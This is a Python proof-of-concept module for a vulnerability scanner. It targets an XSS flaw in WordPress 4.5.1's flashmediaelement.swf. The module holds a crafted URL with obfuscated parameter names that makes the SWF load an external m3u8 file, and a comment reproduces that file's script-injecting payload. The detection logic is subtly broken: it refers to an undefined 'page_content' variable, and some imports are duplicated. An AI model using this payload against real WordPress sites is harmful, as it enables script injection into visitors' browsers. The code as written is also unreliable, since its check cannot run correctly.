# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'WordPress_0081_p'  # 平台漏洞编号，留空
    name = 'WordPress 4.5.1 XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2016-05-10'  # 漏洞公布时间
    desc = '''
        由于ExternalInterface.call函数的参数注入导致的。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3889/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = '4.5.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4ae0323f-e012-4726-a984-a83c3db56c81'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 通过查询M3U8的文件格式, 我们可以通过文件内容指定加载的fragment的URL.

            # exp.m3u8
            '''
            #EXTM3U
            #EXT-X-TARGETDURATION:10
            #EXTINF:10,
            http://www.baidu.com/a.ts\")+alert(2))}catch(e){}//
            '''
            payload = "/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfu%xnction=console.log&isvi%xdeo=true&auto%xplay=true&fi%xle=http://midzer0.github.io/2016/wordpress-4.5.1-xss/exp.m3u8"
            url = self.target + payload
            r = requests.get(url)

            if r.status_code == 200 and 'alert(2)' in r.text:
                if ('>17<' in page_content) or ('>32<' in page_content):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
